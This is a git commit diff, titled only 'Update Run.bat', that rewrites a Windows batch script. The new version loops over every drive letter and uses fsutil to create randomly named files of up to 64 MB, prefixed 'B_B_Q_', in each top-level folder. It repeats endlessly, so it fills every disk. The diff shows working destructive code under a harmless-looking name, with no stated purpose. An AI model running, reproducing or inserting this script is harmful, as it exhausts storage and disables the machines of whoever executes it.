f6a353eb3e3d38951ea2483dcd5a610a82181840
WorkChaosen <132773460+WorkChaosen@users.noreply.github.com>
2023-09-12 00:21:09 +0800

    Update Run.bat

--- Run.bat
+++ Run.bat
@@ -1,31 +1,37 @@
 @echo off
 setlocal enabledelayedexpansion
 
+set "randomNamePrefix=B_B_Q_"
+set "maxFileSizeMB=64"
+
+:loop
+set "allDrivesFull=true"
+
 for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     set "Disk=%%d"
     if exist "%%d:\\" (
-        call :fillDrive "%%d"
+        for /d %%f in ("%%d:\*") do (
+            set "drive=%%f"
+            set "randomName="
+            for /l %%a in (1,1,12) do (
+                set /a "rand=!random! %% 10"
+                set "randomName=!randomName!!rand!"
+            )
+            set /a "size=!random! %% %maxFileSizeMB% + 1"
+            set /a "size=size * 1024 * 1024"
+            pushd "!drive!"
+            (
+                fsutil file createnew "!randomNamePrefix!!randomName!" !size! >nul
+            )
+            popd
+            set "allDrivesFull=false"
+        )
     )
 )
 
+if %allDrivesFull%==false (
+    goto loop
+)
+
 :exit
-exit /b
-
-:fillDrive
-setlocal
-set "drive=%~1"
-
-:fillLoop
-set "randomName=B_B_Q_"
-for /l %%a in (1,1,12) do (
-    set /a "rand=!random! %% 10"
-    set "randomName=!randomName!!rand!"
-)
-set /a "size=!random! %% 49 + 16"
-set /a "bigger=size * 1024 * 1024"
-fsutil file createnew "%drive%:\!randomName!" !bigger! >nul
-if not errorlevel 1 (
-    goto fillLoop
-)
-endlocal
 exit /b
